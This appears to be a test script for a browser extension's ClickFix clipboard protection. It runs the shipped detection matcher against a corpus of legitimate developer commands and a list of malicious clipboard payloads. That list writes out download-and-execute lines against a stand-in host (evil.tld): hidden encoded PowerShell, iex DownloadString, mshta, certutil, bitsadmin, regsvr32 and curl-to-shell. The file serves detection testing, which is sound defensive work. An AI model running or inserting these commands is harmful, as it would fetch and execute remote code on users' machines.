#!/usr/bin/env node
// tools/test-clickfix-clipboard.mjs — the ClickFix clipboard protection's
// detection quality (HARD check).
//
// The tamper test (step 35) proves the protection cannot be switched off by
// page code. This proves the thing it is switching on is actually right:
// that it fires on real ClickFix payloads and NOT on the legitimate command
// lines developer-documentation copy buttons put on the clipboard every day
// — the one false-positive source that would make this protection
// unshippable. A single false positive here fails the run.
//
// Runs the REAL matcher out of js/security/sec-clickfix-clipboard.js (Part D
// step 15 — never a re-implementation, which by construction could not catch
// drift from the shipped file).
//
// Outcomes (C38): PASS / FINDINGS (fails) / DID NOT RUN (fails).
import fs from 'fs';
import path from 'path';
import vm from 'vm';

const ROOT = path.resolve(import.meta.dirname, '..');
const SCRIPTLET = path.join(ROOT, 'js', 'security', 'sec-clickfix-clipboard.js');

console.log('=== ClickFix clipboard protection — detection corpus ===');

function didNotRun(reason) {
    console.log(`DID NOT RUN: ${reason}`);
    console.log('A check that did not run has not passed.');
    process.exit(1);
}

// Lift the matcher out of the real file: everything from the config block up
// to blocked(), which is the self-contained detection half.
let looksLikeClickFix;
try {
    const src = fs.readFileSync(SCRIPTLET, 'utf8');
    const from = src.indexOf('const MAX_INSPECTED_CHARS');
    const to = src.indexOf('function blocked(');
    if ( from === -1 || to === -1 || to <= from ) {
        didNotRun('could not locate the matcher in sec-clickfix-clipboard.js (was it restructured? update this check)');
    }
    const realm = vm.createContext({});
    vm.runInContext(`
        const reflectApply = Reflect.apply;
        const regexExec = RegExp.prototype.exec;
        const strSlice = String.prototype.slice;
        const strToLowerCase = String.prototype.toLowerCase;
        const strIncludes = String.prototype.includes;
        ${src.slice(from, to)}
    `, realm, { filename: 'sec-clickfix-clipboard.js (matcher)' });
    looksLikeClickFix = text => vm.runInContext('looksLikeClickFix', realm)(text);
} catch (err) {
    didNotRun(`cannot load the matcher (${err.message})`);
}

// ── Corpus ───────────────────────────────────────────────────────────────
// LEGITIMATE: what real copy buttons put on the clipboard (package managers,
// container tooling, cloud CLIs, build tools), plus ordinary prose. Several
// are deliberately near-misses: a curl that pipes into gpg rather than a
// shell, certutil hashing a local file, a sentence merely mentioning
// PowerShell, an Invoke-WebRequest that only downloads.
const LEGITIMATE = [
    'npm install --save-dev eslint',
    'npx create-react-app my-app',
    'pip install --break-system-packages pandas',
    'docker run -d -p 8080:80 nginx',
    'docker compose up -d --build',
    'git clone https://github.com/foo/bar.git',
    'sudo apt-get update && sudo apt-get install -y build-essential',
    'brew install node',
    'cargo build --release',
    'go install golang.org/x/tools/cmd/goimports@latest',
    'kubectl apply -f deployment.yaml',
    'terraform init && terraform apply',
    'aws s3 cp ./dist s3://my-bucket --recursive',
    'python3 -m venv .venv && source .venv/bin/activate',
    'ssh -i ~/.ssh/id_rsa user@host',
    'openssl req -new -x509 -days 365 -nodes -out cert.pem',
    'curl -fsSL https://example.com/key.gpg | sudo gpg --dearmor -o /usr/share/keyrings/x.gpg',
    'curl https://api.example.com/v1/users -H "Authorization: Bearer TOKEN"',
    'curl -O https://example.com/archive.zip',
    'wget https://example.com/file.tar.gz',
    'certutil -hashfile installer.exe SHA256',
    'msiexec /i installer.msi /quiet',
    'rundll32 printui.dll,PrintUIEntry /?',
    'powershell Get-ChildItem -Recurse',
    'Invoke-WebRequest -Uri https://example.com -OutFile out.zip',
    'Get-Content .\\log.txt | Select-String "error"',
    'Some ordinary copied sentence from a news article about PowerShell security.',
    'Lorem ipsum dolor sit amet, consectetur adipiscing elit.',
    'https://example.com/some/page?a=1&b=2',
    '',
];
// CLICKFIX: the shapes seen in real campaigns — hidden/encoded PowerShell,
// download-and-execute chains, LOLBins fetching a URL, curl piped to a shell.
const CLICKFIX = [
    'powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
    'powershell.exe -NoProfile -WindowStyle Hidden -Command "iex(New-Object Net.WebClient).DownloadString(\'http://evil.tld/a.ps1\')"',
    'powershell -ep bypass -enc QQBB',
    'pwsh -nop -w hidden -c "irm evil.tld/x | iex"',
    'IEX (New-Object Net.WebClient).DownloadString("http://evil.tld/s.ps1")',
    'Invoke-Expression (Invoke-RestMethod http://evil.tld/p)',
    'mshta http://evil.tld/x.hta',
    'certutil -urlcache -f http://evil.tld/p.exe p.exe',
    'certutil -decode payload.b64 payload.exe',
    'bitsadmin /transfer job http://evil.tld/p.exe C:\\p.exe',
    'regsvr32 /s /n /u /i:http://evil.tld/x.sct scrobj.dll',
    'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";document.write()',
    'msiexec /i https://evil.tld/p.msi /qn',
    'curl -s http://evil.tld/i.sh | sh',
    'wget -qO- http://evil.tld/i.sh | bash',
    'cmd /c start /min powershell -w hidden -c "irm evil.tld/x|iex"',
    'conhost --headless powershell -w hidden -enc AAA',
];

let falsePositives = 0;
let missed = 0;
for ( const text of LEGITIMATE ) {
    const hit = looksLikeClickFix(text);
    if ( hit !== null ) {
        falsePositives += 1;
        console.log(`FALSE POSITIVE: ${JSON.stringify(text)} -> matched ${JSON.stringify(hit)}`);
    }
}
for ( const text of CLICKFIX ) {
    if ( looksLikeClickFix(text) === null ) {
        missed += 1;
        console.log(`MISSED: ${JSON.stringify(text)}`);
    }
}
// A payload beyond the inspected window is out of scope by design — assert
// the documented limit rather than leaving it implicit.
const padded = `${'x'.repeat(4000)} powershell -w hidden -enc AAA`;
const windowRespected = looksLikeClickFix(padded) === null;

console.log(`\nlegitimate: ${LEGITIMATE.length - falsePositives}/${LEGITIMATE.length} clean | clickfix: ${CLICKFIX.length - missed}/${CLICKFIX.length} caught | inspection window enforced: ${windowRespected ? 'yes' : 'no'}`);
if ( falsePositives !== 0 || missed !== 0 ) {
    console.log('\nFAIL: a false positive breaks ordinary copy buttons; a miss leaves the attack working.');
    process.exit(1);
}
console.log('PASS: no false positives on legitimate command lines, every ClickFix payload caught.');
